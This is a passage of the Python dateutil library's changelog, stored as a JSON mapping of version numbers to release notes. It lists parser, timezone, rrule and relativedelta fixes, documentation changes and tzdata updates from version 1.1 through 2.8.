859).\n- Added support for sub-minute time zone offsets in Python 3.6+.\n  Fixed by cssherry (gh issue 582, pr 763)\n- Switched the ``tzoffset``, ``tzstr`` and ``gettz`` caches over to using weak\n  references, so that the cache expires when no other references to the\n  original ``tzinfo`` objects exist. This cache-expiry behavior is not\n  guaranteed in the public interface and may change in the future. To improve\n  performance in the case where transient references to the same time zones\n  are repeatedly created but no strong reference is continuously held, a\n  smaller \"strong value\" cache was also added. Weak value cache implemented by\n  cs-cordero (gh pr 672, 801), strong cache added by\n  G\u00f6k\u00e7en Nurlu (gh issue 691, gh pr 761)\n\n\nBugfixes\n--------\n\n- Add support for ISO 8601 times with comma as the decimal separator in the\n  ``dateutil.parser.isoparse`` function. (gh pr 721)\n- Changed handling of ``T24:00`` to be compliant with the standard. ``T24:00``\n  now represents midnight on the *following* day.\n  Fixed by cheukting (gh issue 658, gh pr 751)\n- Fixed an issue where ``isoparser.parse_isotime`` was unable to handle the\n  ``24:00`` variant representation of midnight. (gh pr 773)\n- Added support for more than 6 fractional digits in `isoparse`.\n  Reported and fixed by jayschwa (gh issue 786, gh pr 787).\n- Added 'z' (lower case Z) as valid UTC time zone in isoparser.\n  Reported by cjgibson (gh issue 820). Fixed by Cheukting (gh pr 822)\n- Fixed a bug with base offset changes during DST in ``tzfile``, and refactored\n  the way base offset changes are detected. Originally reported on\n  Stack Overflow by MartinThoma. (gh issue 812, gh pr 810)\n- Fixed error condition in ``tz.gettz`` when a non-ASCII timezone is passed on\n  Windows in Python 2.7. (gh issue 802, pr 861)\n- Improved performance and inspection properties of ``tzname`` methods.\n  (gh pr 811)\n- Removed unnecessary binary_type compatibility shims.\n  Added by jdufresne (gh pr 817)\n- Changed ``python setup.py test`` to print an error to ``stderr`` and exit\n  with 1 instead of 0. Reported and fixed by hroncok (gh pr 814)\n- Added a ``pyproject.toml`` file with build requirements and an explicitly\n  specified build backend. (gh issue 736, gh prs 746, 863)\n\n\nDocumentation changes\n---------------------\n\n- Added documentation for the ``rrule.rrulestr`` function.\n  Fixed by prdickson (gh issue 623, gh pr 762)\n- Add documentation for the ``dateutil.tz.win`` module and mocked out certain\n  Windows-specific modules so that autodoc can still be run on non-Windows\n  systems. (gh issue 442, pr 715)\n- Added changelog to documentation. (gh issue 692, gh pr 707)\n- Improved documentation on the use of ``until`` and ``count`` parameters in\n  ``rrule``. Fixed by lucaferocino (gh pr 755).\n- Added an example of how to use a custom ``parserinfo`` subclass to parse\n  non-standard datetime formats in the examples documentation for ``parser``.\n  Added by prdickson (gh 753)\n- Expanded the description and examples in the ``relativedelta`` class.\n  Contributed by andrewcbennett (gh pr 759)\n- Improved the contributing documentation to clarify where to put new changelog\n  files. Contributed by andrewcbennett (gh pr 757)\n- Fixed a broken doctest in the ``relativedelta`` module.\n  Fixed by nherriot (gh pr 758).\n- Reorganized ``dateutil.tz`` documentation and fixed issue with the\n  ``dateutil.tz`` docstring. (gh pr 714)\n\n\nMisc\n----\n\n- GH 720, GH 723, GH 726, GH 727, GH 740, GH 750, GH 760, GH 767,\n  GH 772, GH 773, GH 780, GH 784, GH 785, GH 791, GH 799, GH 813,\n  GH 836, GH 839, GH 857\n\n\n", "2.7.5": "==========================\n\nData updates\n------------\n\n- Update tzdata to 2018g\n\n\n", "2.7.4": "==========================\n\nData updates\n------------\n\n- Updated tzdata version to 2018f.\n\n\n", "2.7.3": "==========================\n\nData updates\n------------\n\n- Update tzdata to 2018e. (gh pr 710)\n\n\nBugfixes\n--------\n\n- Fixed an issue where ``parser.parse`` would raise ``Decimal``-specific errors\n  instead of a standard ``ValueError`` if certain malformed values were parsed\n  (e.g. ``NaN`` or infinite values). Reported and fixed by\n  amureki (gh issue 662, gh pr 679).\n- Fixed issue in ``parser`` where a ``tzinfos`` call explicitly returning\n  ``None`` would throw a ``ValueError``.\n  Fixed by parsethis (gh issue 661, gh pr 681)\n- Fixed incorrect parsing of certain dates earlier than 100 AD when represented\n  in the form \"%B.%Y.%d\", e.g. \"December.0031.30\". (gh issue 687, pr 700)\n- Added time zone inference when initializing an ``rrule`` with a specified\n  ``UNTIL`` but without an explicitly specified ``DTSTART``; the time zone\n  of the generated ``DTSTART`` will now be taken from the ``UNTIL`` rule.\n  Reported by href (gh issue 652). Fixed by absreim (gh pr 693).\n\nDocumentation changes\n---------------------\n\n- Corrected link syntax and updated URL to https for ISO year week number\n  notation in relativedelta examples. (gh issue 670, pr 711)\n- Add doctest examples to tzfile documentation. Done by weatherpattern and\n  pganssle (gh pr 671)\n- Updated the documentation for relativedelta. Removed references to tuple\n  arguments for weekday, explained effect of weekday(_, 1) and better explained\n  the order of operations that relativedelta applies. Fixed by kvn219\n  huangy22 and ElliotJH (gh pr 673)\n- Added changelog to documentation. (gh issue 692, gh pr 707)\n- Changed order of keywords in rrule docstring. Reported and fixed by\n  rmahajan14 (gh issue 686, gh pr 695).\n- Added documentation for ``dateutil.tz.gettz``. Reported by pganssle (gh\n  issue 647). Fixed by weatherpattern (gh pr 704)\n- Cleaned up malformed RST in the ``tz`` documentation. (gh issue 702, gh pr\n  706)\n- Changed the default theme to ``sphinx_rtd_theme``, and changed the sphinx\n  configuration accordingly. (gh pr 707)\n- Reorganized ``dateutil.tz`` documentation and fixed issue with the\n  ``dateutil.tz`` docstring. (gh pr 714)\n\n\nMisc\n----\n\n- GH 674, GH 688, GH 699\n\n\n", "2.7.2": "==========================\n\nBugfixes\n--------\n\n- Fixed an issue with the setup script running in non-UTF-8 environment.\n  Reported and fixed by gergondet (gh pr 651)\n\n\nMisc\n----\n\n- GH 655\n\n\n", "2.7.1": "===========================\n\nData updates\n------------\n\n- Updated tzdata version to 2018d.\n\n\nBugfixes\n--------\n\n- Fixed issue where parser.parse would occasionally raise\n  decimal.Decimal-specific error types rather than ValueError. Reported by\n  amureki (gh issue 632). Fixed by pganssle (gh pr 636).\n- Improve error message when rrule's dtstart and until are not both naive or\n  both aware. Reported and fixed by ryanpetrello (gh issue 633, gh pr 634)\n\n\nMisc\n----\n\n- GH 644, GH 648\n\n\n", "2.7.0": "=============\n- Dropped support for Python 2.6 (gh pr 362 by jdufresne)\n- Dropped support for Python 3.2 (gh pr 626)\n- Updated zoneinfo file to 2018c (gh pr 616)\n- Changed licensing scheme so all new contributions are dual licensed under\n  Apache 2.0 and BSD. (gh pr 542, issue 496)\n- Added __all__ variable to the root package. Reported by tebriel\n  (gh issue 406), fixed by mariocj89 (gh pr 494)\n- Added python_requires to setup.py so that pip will distribute the right\n  version of dateutil. Fixed by jakec-github (gh issue 537, pr 552)\n- Added the utils submodule, for miscellaneous utilities.\n- Added within_delta function to utils - added by justanr (gh issue 432,\n  gh pr 437)\n- Added today function to utils (gh pr 474)\n- Added default_tzinfo function to utils (gh pr 475), solving an issue\n  reported by nealmcb (gh issue 94)\n- Added dedicated ISO 8601 parsing function isoparse (gh issue 424).\n  Initial implementation by pganssle in gh pr 489 and 622, with a\n  pre-release fix by kirit93 (gh issue 546, gh pr 573).\n- Moved parser module into parser/_parser.py and officially deprecated the use\n  of several private functions and classes from that module. (gh pr 501, 515)\n- Tweaked parser error message to include rejected string format, added by\n  pbiering (gh pr 300)\n- Add support for parsing bytesarray, reported by uckelman (gh issue 417) and\n  fixed by uckelman and pganssle (gh pr 514)\n- Started raising a warning when the parser finds a timezone string that it\n  cannot construct a tzinfo instance for (rather than succeeding with no\n  indication of an error). Reported and fixed by jbrockmendel (gh pr 540)\n- Dropped the use of assert in the parser. Fixed by jbrockmendel (gh pr 502)\n- Fixed to assertion logic in parser to support dates like '2015-15-May',\n  reported and fixed by jbrockmendel (gh pr 409)\n- Fixed IndexError in parser on dates with trailing colons, reported and fixed\n  by jbrockmendel (gh pr 420)\n- Fixed bug where hours were not validated, leading to improper parse. Reported\n  by heappro (gh pr 353), fixed by jbrockmendel (gh pr 482)\n- Fixed problem parsing strings in %b-%Y-%d format. Reported and fixed by\n  jbrockmendel (gh pr 481)\n- Fixed problem parsing strings in the %d%B%y format. Reported by asishm\n  (gh issue 360), fixed by jbrockmendel (gh pr 483)\n- Fixed problem parsing certain unambiguous strings when year <99 (gh pr 510).\n  Reported by alexwlchan (gh issue 293).\n- Fixed issue with parsing an unambiguous string representation of an ambiguous\n  datetime such that if possible the correct value for fold is set. Fixes\n  issue reported by JordonPhillips and pganssle (gh issue 318, 320,\n  gh pr 517)\n- Fixed issue with improper rounding of fractional components. Reported by\n  dddmello (gh issue 427), fixed by m-dz (gh pr 570)\n- Performance improvement to parser from removing certain min() calls. Reported\n  and fixed by jbrockmendel (gh pr 589)\n- Significantly refactored parser code by jbrockmendel (gh prs 419, 436,\n  490, 498, 539) and pganssle (gh prs 435, 468)\n- Implemented of __hash__ for relativedelta and weekday, reported and fixed\n  by mrigor (gh pr 389)\n- Implemented __abs__ for relativedelta. Reported by binnisb and pferreir\n  (gh issue 350, pr 472)\n- Fixed relativedelta.weeks property getter and setter to work for both\n  negative and positive values. Reported and fixed by souliane (gh issue 459,\n  pr 460)\n- Fixed issue where passing whole number floats to the months or years\n  arguments of the relativedelta constructor would lead to errors during\n  addition. Reported by arouanet (gh pr 411), fixed by lkollar (gh pr 553)\n- Added a pre-built tz.UTC object representing UTC (gh pr 497)\n- Added a cache to tz.gettz so that by default it will return the same object\n  for identical inputs. This will change the semantics of certain operations\n  between datetimes constructed with tzinfo=tz.gettz(...). (gh pr 628)\n- Changed the behavior of tz.tzutc to return a singleton (gh pr 497, 504)\n- Changed the behavior of tz.tzoffset to return the same object when passed the\n  same inputs, with a corresponding performance improvement (gh pr 504)\n- Changed the behavior of tz.tzstr to return the same object when passed the\n  same inputs. (gh pr 628)\n- Added .instance alternate constructors for tz.tzoffset and tz.tzstr, to\n  allow the construction of a new instance if desired. (gh pr 628)\n- Added the tz.gettz.nocache function to allow explicit retrieval of a new\n  instance of the relevant tzinfo. (gh pr 628)\n- Expand definition of tz.tzlocal equality so that the local zone is allow\n  equality with tzoffset and tzutc. (gh pr 598)\n- Deprecated the idiosyncratic tzstr format mentioned in several examples but\n  evidently designed exclusively for dateutil, and very likely not used by\n  any current users. (gh issue 595, gh pr 606)\n- Added the tz.resolve_imaginary function, which generates a real date from\n  an imaginary one, if necessary. Implemented by Cheukting (gh issue 339,\n  gh pr 607)\n- Fixed issue where the tz.tzstr constructor would erroneously succeed if\n  passed an invalid value for tzstr. Fixed by pablogsal (gh issue 259,\n  gh pr 581)\n- Fixed issue with tz.gettz for TZ variables that start with a colon. Reported\n  and fixed by lapointexavier (gh pr 601)\n- Added a lock to tz.tzical's cache. Reported and fixed by Unrud (gh pr 430)\n- Fixed an issue with fold support on certain Python 3 implementations that\n  used the pre-3.6 pure Python implementation of datetime.replace, most\n  notably pypy3 (gh pr 446).\n- Added support for VALUE=DATE-TIME for DTSTART in rrulestr. Reported by potuz\n  (gh issue 401) and fixed by Unrud (gh pr 429)\n- Started enforcing that within VTIMEZONE, the VALUE parameter can only be\n  omitted or DATE-TIME, per RFC 5545. Reported by Unrud (gh pr 439)\n- Added support for TZID parameter for DTSTART in rrulestr. Reported and\n  fixed by ryanpetrello (gh issue 614, gh pr 624)\n- Added 'RRULE:' prefix to rrule strings generated by rrule.__str__, in\n  compliance with the RFC. Reported by AndrewPashkin (gh issue 86), fixed by\n  jarondl and mlorant (gh pr 450)\n- Switched to setuptools_scm for version management, automatically calculating\n  a version number from the git metadata. Reported by jreback (gh issue 511),\n  implemented by Sulley38 (gh pr 564)\n- Switched setup.py to use find_packages, and started testing against pip\n  installed versions of dateutil in CI. Fixed issue with parser import\n  discovered by jreback in pandas-dev/pandas18141. (gh issue 507, pr 509)\n- Switched test suite to using pytest (gh pr 495)\n- Switched CI over to use tox. Fixed by gaborbernat (gh pr 549)\n- Added a test-only dependency on freezegun. (gh pr 474)\n- Reduced number of CI builds on Appveyor. Fixed by kirit93 (gh issue 529,\n  gh pr 579)\n- Made xfails strict by default, so that an xpass is a failure. (gh pr 567)\n- Added a documentation generation stage to tox and CI. (gh pr 568)\n- Added an explicit warning when running python setup.py explaining how to run\n  the test suites with pytest. Fixed by lkollar. (gh issue 544, gh pr 548)\n- Added requirements-dev.txt for test dependency management (gh pr 499, 516)\n- Fixed code coverage metrics to account for Windows builds (gh pr 526)\n- Fixed code coverage metrics to NOT count xfails. Fixed by gaborbernat\n  (gh issue 519, gh pr 563)\n- Style improvement to zoneinfo.tzfile that was confusing to static type\n  checkers. Reported and fixed by quodlibetor (gh pr 485)\n- Several unused imports were removed by jdufresne. (gh pr 486)\n- Switched ``isinstance(*, collections.Callable)`` to callable, which is available\n  on all supported Python versions. Implemented by jdufresne (gh pr 612)\n- Added CONTRIBUTING.md (gh pr 533)\n- Added AUTHORS.md (gh pr 542)\n- Corrected setup.py metadata to reflect author vs. maintainer, (gh issue 477,\n  gh pr 538)\n- Corrected README to reflect that tests are now run in pytest. Reported and\n  fixed by m-dz (gh issue 556, gh pr 557)\n- Updated all references to RFC 2445 (iCalendar) to point to RFC 5545. Fixed\n  by mariocj89 (gh issue 543, gh pr 555)\n- Corrected parse documentation to reflect proper integer offset units,\n  reported and fixed by abrugh (gh pr 458)\n- Fixed dangling parenthesis in tzoffset documentation (gh pr 461)\n- Started including the license file in wheels. Reported and fixed by\n  jdufresne (gh pr 476)\n- Indentation fixes to parser docstring by jbrockmendel (gh pr 492)\n- Moved many examples from the \"examples\" documentation into their appropriate\n  module documentation pages. Fixed by Tomasz-Kluczkowski and jakec-github\n  (gh pr 558, 561)\n- Fixed documentation so that the parser.isoparse documentation displays.\n  Fixed by alexchamberlain (gh issue 545, gh pr 560)\n- Refactored build and release sections and added setup instructions to\n  CONTRIBUTING. Reported and fixed by kynan (gh pr 562)\n- Cleaned up various dead links in the documentation. (gh pr 602, 608, 618)\n\n", "2.6.1": "=============\n- Updated zoneinfo file to 2017b. (gh pr 395)\n- Added Python 3.6 to CI testing (gh pr 365)\n- Removed duplicate test name that was preventing a test from being run.\n  Reported and fixed by jdufresne (gh pr 371)\n- Fixed testing of folds and gaps, particularly on Windows (gh pr 392)\n- Fixed deprecated escape characters in regular expressions. Reported by\n  nascheme and thierryba (gh issue 361), fixed by thierryba (gh pr 358)\n- Many PEP8 style violations and other code smells were fixed by jdufresne\n  (gh prs 358, 363, 364, 366, 367, 368, 372, 374, 379, 380, 398)\n- Improved performance of tzutc and tzoffset objects. (gh pr 391)\n- Fixed issue with several time zone classes around DST transitions in any\n  zones with +0 standard offset (e.g. Europe/London) (gh issue 321, pr 390)\n- Fixed issue with fuzzy parsing where tokens similar to AM/PM that are in the\n  end skipped were dropped in the fuzzy_with_tokens list. Reported and fixed\n  by jbrockmendel (gh pr 332).\n- Fixed issue with parsing dates of the form X m YY. Reported by jbrockmendel.\n  (gh issue 333, pr 393)\n- Added support for parser weekdays with less than 3 characters. Reported by\n  arcadefoam (gh issue 343), fixed by jonemo (gh pr 382)\n- Fixed issue with the addition and subtraction of certain relativedeltas.\n  Reported and fixed by kootenpv (gh issue 346, pr 347)\n- Fixed issue where the COUNT parameter of rrules was ignored if 0. Fixed by\n  mshenfield (gh pr 330), reported by vaultah (gh issue 329).\n- Updated documentation to include the new tz methods. (gh pr 324)\n- Update documentation to reflect that the parser can raise TypeError, reported\n  and fixed by tomchuk (gh issue 336, pr 337)\n- Fixed an incorrect year in a parser doctest. Fixed by xlotlu (gh pr 357)\n- Moved version information into _version.py and set up the versions more\n  granularly.\n\n", "2.6.0": "=============\n- Added PEP-495-compatible methods to address ambiguous and imaginary dates in\n  time zones in a backwards-compatible way. Ambiguous dates and times can now\n  be safely represented by all dateutil time zones. Many thanks to Alexander\n  Belopolski (abalkin) and Tim Peters tim-one for their inputs on how to\n  address this. Original issues reported by Yupeng and zed (lP: 1390262,\n  gh issues 57, 112, 249, 284, 286, prs 127, 225, 248, 264, 302).\n- Added new methods for working with ambiguous and imaginary dates to the tz\n  module. datetime_ambiguous() determines if a datetime is ambiguous for a given\n  zone and datetime_exists() determines if a datetime exists in a given zone.\n  This works for all fold-aware datetimes, not just those provided by dateutil.\n  (gh issue 253, gh pr 302)\n- Fixed an issue where dst() in Portugal in 1996 was returning the wrong value\n  in tz.tzfile objects. Reported by abalkin (gh issue 128, pr 225)\n- Fixed an issue where zoneinfo.ZoneInfoFile errors were not being properly\n  deep-copied. (gh issue 226, pr 225)\n- Refactored tzwin and tzrange as a subclass of a common class, tzrangebase, as\n  there was substantial overlapping functionality. As part of this change,\n  tzrange and tzstr now expose a transitions() function, which returns the\n  DST on and off transitions for a given year. (gh issue 260, pr 302)\n- Deprecated zoneinfo.gettz() due to confusion with tz.gettz(), in favor of\n  get() method of zoneinfo.ZoneInfoFile objects. (gh issue 11, pr 310)\n- For non-character, non-stream arguments, parser.parse now raises TypeError\n  instead of AttributeError. (gh issues 171, 269, pr 247)\n- Fixed an issue where tzfile objects were not properly handling dst() and\n  tzname() when attached to datetime.time objects. Reported by ovacephaloid.\n  (gh issue 292, pr 309)\n- /usr/share/lib/zoneinfo was added to TZPATHS for compatibility with Solaris\n  systems. Reported by dhduvall (gh issue 276, pr 307)\n- tzoffset and tzrange objects now accept either a number of seconds or a\n  datetime.timedelta() object wherever previously only a number of seconds was\n  allowed. (gh pr 264, 277)\n- datetime.timedelta objects can now be added to relativedelta objects. Reported\n  and added by Alec Nikolas Reiter (justanr) (gh issue 282, pr 283\n- Refactored relativedelta.weekday and rrule.weekday into a common base class\n  to reduce code duplication. (gh issue 140, pr 311)\n- An issue where the WKST parameter was improperly rendering in str(rrule) was\n  reported and fixed by Daniel LePage (dplepage). (gh issue 262, pr 263)\n- A replace() method has been added to rrule objects by jendas1, which creates\n  new rrule with modified attributes, analogous to datetime.replace (gh pr 167)\n- Made some significant performance improvements to rrule objects in Python 2.x\n  (gh pr 245)\n- All classes defining equality functions now return NotImplemented when\n  compared to unsupported classes, rather than raising TypeError, to allow other\n  classes to provide fallback support. (gh pr 236)\n- Several classes have been marked as explicitly unhashable to maintain\n  identical behavior between Python 2 and 3. Submitted by Roy Williams\n  (rowillia) (gh pr 296)\n- Trailing whitespace in easter.py has been removed. Submitted by OmgImAlexis\n  (gh pr 299)\n- Windows-only batch files in build scripts had line endings switched to CRLF.\n  (gh pr 237)\n- adamchainz updated the documentation links to reflect that the canonical\n  location for readthedocs links is now at .io, not .org. (gh pr 272)\n- Made some changes to the CI and codecov to test against newer versions of\n  Python and pypy, and to adjust the code coverage requirements. For the moment,\n  full pypy3 compatibility is not supported until a new release is available,\n  due to upstream bugs in the old version affecting PEP-495 support.\n  (gh prs 265, 266, 304, 308)\n- The full PGP signing key fingerprint was added to the README.md in favor of\n  the previously used long-id. Reported by valholl (gh issue 287, pr 304)\n- Updated zoneinfo to 2016i. (gh issue 298, gh pr 306)\n\n\n", "2.5.3": "=============\n- Updated zoneinfo to 2016d\n- Fixed parser bug where unambiguous datetimes fail to parse when dayfirst is\n  set to true. (gh issue 233, pr 234)\n- Bug in zoneinfo file on platforms such as Google App Engine which do not\n  do not allow importing of subprocess.check_call was reported and fixed by\n  savraj (gh issue 239, gh pr 240)\n- Fixed incorrect version in documentation (gh issue 235, pr 243)\n\n", "2.5.2": "=============\n- Updated zoneinfo to 2016c\n- Fixed parser bug where yearfirst and dayfirst parameters were not being\n  respected when no separator was present. (gh issue 81 and 217, pr 229)\n\n", "2.5.1": "=============\n- Updated zoneinfo to 2016b\n- Changed MANIFEST.in to explicitly include test suite in source distributions,\n  with help from koobs (gh issue 193, pr 194, 201, 221)\n- Explicitly set all line-endings to LF, except for the NEWS file, on a\n  per-repository basis (gh pr 218)\n- Fixed an issue with improper caching behavior in rruleset objects (gh issue\n  104, pr 207)\n- Changed to an explicit error when rrulestr strings contain a missing BYDAY\n  (gh issue 162, pr 211)\n- tzfile now correctly handles files containing leapcnt (although the leapcnt\n  information is not actually used). Contributed by hjoukl (gh issue 146, pr\n  147)\n- Fixed recursive import issue with tz module (gh pr 204)\n- Added compatibility between tzwin objects and datetime.time objects (gh issue\n  216, gh pr 219)\n- Refactored monolithic test suite by module (gh issue 61, pr 200 and 206)\n- Improved test coverage in the relativedelta module (gh pr 215)\n- Adjusted documentation to reflect possibly counter-intuitive properties of\n  RFC-5545-compliant rrules, and other documentation improvements in the rrule\n  module (gh issue 105, gh issue 149 - pointer to the solution by phep,\n  pr 213).\n\n\n", "2.5.0": "=============\n- Updated zoneinfo to 2016a\n- zoneinfo_metadata file version increased to 2.0 - the updated updatezinfo.py\n  script will work with older zoneinfo_metadata.json files, but new metadata\n  files will not work with older updatezinfo.py versions. Additionally, we have\n  started hosting our own mirror of the Olson databases on a GitHub pages\n  site (https://dateutil.github.io/tzdata/) (gh pr #183)\n- dateutil zoneinfo tarballs now contain the full zoneinfo_metadata file used\n  to generate them. (gh issue 27, gh pr 85)\n- relativedelta can now be safely subclassed without derived objects reverting\n  to base relativedelta objects as a result of arithmetic operations.\n  (lp:1010199, gh issue 44, pr 49)\n- relativedelta 'weeks' parameter can now be set and retrieved as a property of\n  relativedelta instances. (lp: 727525, gh issue 45, pr 49)\n- relativedelta now explicitly supports fractional relative weeks, days, hours,\n  minutes and seconds. Fractional values in absolute parameters (year, day, etc)\n  are now deprecated. (gh issue 40, pr 190)\n- relativedelta objects previously did not use microseconds to determine of two\n  relativedelta objects were equal. This oversight has been corrected.\n  Contributed by elprans (gh pr 113)\n- rrule now has an xafter() method for retrieving multiple recurrences after a\n  specified date. (gh pr 38)\n- str(rrule) now returns an RFC2445-compliant rrule string, contributed by\n  schinckel and armicron (lp:1406305, gh issue 47, prs 50, 62 and 160)\n- rrule performance under certain conditions has been significantly improved\n  thanks to a patch contributed by dekoza, based on an article by Brian Beck\n  (exogen) (gh pr 136)\n- The use of both the 'until' and 'count' parameters is now deprecated as\n  inconsistent with RFC2445 (gh pr 62, 185)\n- Parsing an empty string will now raise a ValueError, rather than returning the\n  datetime passed to the 'default' parameter. (gh issue 78, pr 187)\n- tzwinlocal objects now have a meaningful repr() and str() implementation\n  (gh issue 148, prs 184 and 186)\n- Added equality logic for tzwin and tzwinlocal objects. (gh issue 151,\n  pr 180, 184)\n- Added some flexibility in subclassing timelex, and switched the default\n  behavior over to using string methods rather than comparing against a fixed\n  list. (gh pr 122, 139)\n- An issue causing tzstr() to crash on Python 2.x was fixed. (lp: 1331576,\n  gh issue 51, pr 55)\n- An issue with string encoding causing exceptions under certain circumstances\n  when tzname() is called was fixed. (gh issue 60, 74, pr 75)\n- Parser issue where calling parse() on dates with no day specified when the\n  day of the month in the default datetime (which is \"today\" if unspecified) is\n  greater than the number of days in the parsed month was fixed (this issue\n  tended to crop up between the 29th and 31st of the month, for obvious reasons)\n  (canonical gh issue 25, pr 30, 191)\n- Fixed parser issue causing fuzzy_with_tokens to raise an unexpected exception\n  in certain circumstances. Contributed by MichaelAquilina (gh pr 91)\n- Fixed parser issue where years > 100 AD were incorrectly parsed. Contributed\n  by Bachmann1234 (gh pr 130)\n- Fixed parser issue where commas were not a valid separator between seconds\n  and microseconds, preventing parsing of ISO 8601 dates. Contributed by\n  ryanss (gh issue 28, pr 106)\n- Fixed issue with tzwin encoding in locales with non-Latin alphabets\n  (gh issue 92, pr 98)\n- Fixed an issue where tzwin was not being properly imported on Windows.\n  Contributed by labrys. (gh pr 134)\n- Fixed a problem causing issues importing zoneinfo in certain circumstances.\n  Issue and solution contributed by alexxv (gh issue 97, pr 99)\n- Fixed an issue where dateutil timezones were not compatible with basic time\n  objects. One of many, many timezone related issues contributed and tested by\n  labrys. (gh issue 132, pr 181)\n- Fixed issue where tzwinlocal had an invalid utcoffset. (gh issue 135,\n  pr 141, 142)\n- Fixed issue with tzwin and tzwinlocal where DST transitions were incorrectly\n  parsed from the registry. (gh issue 143, pr 178)\n- updatezinfo.py no longer suppresses certain OSErrors. Contributed by bjamesv\n  (gh pr 164)\n- An issue that arose when timezone locale changes during runtime has been\n  fixed by carlosxl and mjschultz (gh issue 100, prs 107, 109)\n- Python 3.5 was added to the supported platforms in the metadata (tacaswell\n  gh pr 159) and the test suites (moreati gh pr 117).\n- An issue with tox failing without unittest2 installed in Python 2.6 was fixed\n  by moreati (gh pr 115)\n- Several deprecated functions were replaced in the tests by moreati\n  (gh pr 116)\n- Improved the logic in Travis and Appveyor to alleviate issues where builds\n  were failing due to connection issues when downloading the IANA timezone\n  files. In addition to adding our own mirror for the files (gh pr 183), the\n  download is now retried a number of times (with a delay) (gh pr 177)\n- Many failing doctests were fixed by moreati. (gh pr 120)\n- Many fixes to the documentation (gh pr 103, gh pr 87 from radarhere,\n  gh pr 154 from gpoesia, gh pr 156 from awsum, gh pr 168 from ja8zyjits)\n- Added a code coverage tool to the CI to help improve the library. (gh pr 182)\n- We now have a mailing list - dateutilpython.org, graciously hosted by\n  Python.org.\n\n\n", "2.4.2": "=============\n- Updated zoneinfo to 2015b.\n- Fixed issue with parsing of tzstr on Python 2.7.x; tzstr will now be decoded\n  if not a unicode type. gh 51 (lp:1331576), gh pr 55.\n- Fix a parser issue where AM and PM tokens were showing up in fuzzy date\n  stamps, triggering inappropriate errors. gh 56 (lp: 1428895), gh pr 63.\n- Missing function \"setcachesize\" removed from zoneinfo __all__ list by ryanss,\n  fixing an issue with wildcard imports of dateutil.zoneinfo. (gh pr 66).\n- (PyPI only) Fix an issue with source distributions not including the test\n  suite.\n\n\n", "2.4.1": "=============\n\n- Added explicit check for valid hours if AM/PM is specified in parser.\n  (gh pr 22, issue 21)\n- Fix bug in rrule introduced in 2.4.0 where byweekday parameter was not\n  handled properly. (gh pr 35, issue 34)\n- Fix error where parser allowed some invalid dates, overwriting existing hours\n  with the last 2-digit number in the string. (gh pr 32, issue 31)\n- Fix and add test for Python 2.x compatibility with boolean checking of\n  relativedelta objects. Implemented by nimasmi (gh pr 43) and C\u00e9dric Krier\n  (lp: 1035038)\n- Replaced parse() calls with explicit datetime objects in unit tests unrelated\n  to parser. (gh pr 36)\n- Changed private _byxxx from sets to sorted tuples and fixed one currently\n  unreachable bug in _construct_byset. (gh pr 54)\n- Additional documentation for parser (gh pr 29, 33, 41) and rrule.\n- Formatting fixes to documentation of rrule and README.rst.\n- Updated zoneinfo to 2015a.\n\n", "2.4.0": "=============\n\n- Fix an issue with relativedelta and freezegun (lp:1374022)\n- Fix tzinfo in windows for timezones without dst (lp:1010050, gh 2)\n- Ignore missing timezones in windows like in POSIX\n- Fix minimal version requirement for six (gh 6)\n- Many rrule changes and fixes by pganssle (gh pull requests 13 14 17),\n    including defusing some infinite loops (gh 4)\n\n", "2.3": "===========\n\n- Cleanup directory structure, moved test.py to dateutil/tests/test.py\n\n- Changed many aspects of dealing with the zone info file. Instead of a cache,\n  all the zones are loaded to memory, but symbolic links are loaded only once,\n  so not much memory is used.\n\n- The package is now zip-safe, and universal-wheelable, thanks to changes in\n  the handling of the zoneinfo file.\n\n- Fixed tzwin silently not imported on windows python2\n\n- New maintainer, together with new hosting: GitHub, Travis, Read-The-Docs\n\n", "2.2": "===========\n\n- Updated zoneinfo to 2013h\n\n- fuzzy_with_tokens parse addon from Christopher Corley\n\n- Bug with LANG=C fixed by Mike Gilbert\n\n", "2.1": "===========\n\n- New maintainer\n\n- Dateutil now works on Python 2.6, 2.7 and 3.2 from same codebase (with six)\n\n- 704047: Ismael Carnales' patch for a new time format\n\n- Small bug fixes, thanks for reporters!\n\n\n", "2.0": "===========\n\n- Ported to Python 3, by Brian Jones.  If you need dateutil for Python 2.X,\n  please continue using the 1.X series.\n\n- There's no such thing as a \"PSF License\".  This source code is now\n  made available under the Simplified BSD license.  See LICENSE for\n  details.\n\n", "1.5": "===========\n\n- As reported by Mathieu Bridon, rrules were matching the bysecond rules\n  incorrectly against byminute in some circumstances when the SECONDLY\n  frequency was in use, due to a copy & paste bug.  The problem has been\n  unittested and corrected.\n\n- Adam Ryan reported a problem in the relativedelta implementation which\n  affected the yearday parameter in the month of January specifically.\n  This has been unittested and fixed.\n\n- Updated timezone information.\n\n\n", "1.4.1": "=============\n\n- Updated timezone information.\n\n\n", "1.4": "===========\n\n- Fixed another parser precision problem on conversion of decimal seconds\n  to microseconds, as reported by Erik Brown.  Now these issues are gone\n  for real since it's not using floating point arithmetic anymore.\n\n- Fixed case where tzrange.utcoffset and tzrange.dst() might fail due\n  to a date being used where a datetime was expected (reported and fixed\n  by Lennart Regebro).\n\n- Prevent tzstr from introducing daylight timings in strings that didn't\n  specify them (reported by Lennart Regebro).\n\n- Calls like gettz(\"GMT+3\") and gettz(\"UTC-2\") will now return the\n  expected values, instead of the TZ variable behavior.\n\n- Fixed DST signal handling in zoneinfo files.  Reported by\n  Nicholas F. Fabry and John-Mark Gurney.\n\n\n", "1.3": "===========\n\n- Fixed precision problem on conversion of decimal seconds to\n  microseconds, as reported by Skip Montanaro.\n\n- Fixed bug in constructor of parser, and converted parser classes to\n  new-style classes.  Original report and patch by Michael Elsd\u00f6rfer.\n\n- Initialize tzid and comps in tz.py, to prevent the code from ever\n  raising a NameError (even with broken files).  Johan Dahlin suggested\n  the fix after a pyflakes run.\n\n- Version is now published in dateutil.__version__, as requested\n  by Darren Dale.\n\n- All code is compatible with new-style division.\n\n\n", "1.2": "===========\n\n- Now tzfile will round timezones to full-minutes if necessary,\n  since Python's datetime doesn't support sub-minute offsets.\n  Thanks to Ilpo Nyyss\u00f6nen for reporting the issue.\n\n- Removed bare string exceptions, as reported and fixed by\n  Wilfredo S\u00e1nchez Vega.\n\n- Fix bug in leap count parsing (reported and fixed by Eugene Oden).\n\n\n", "1.1": "===========\n\n- Fixed rrule byyearday handling. Abramo Bagnara pointed out that\n  RFC2445 allows negative numbers.\n\n- Fixed --prefix handling in setup.py (by Sidnei da Silva).\n\n- Now tz.gettz() returns a tzlocal instance when not given any\n  arguments and no other timezone information is 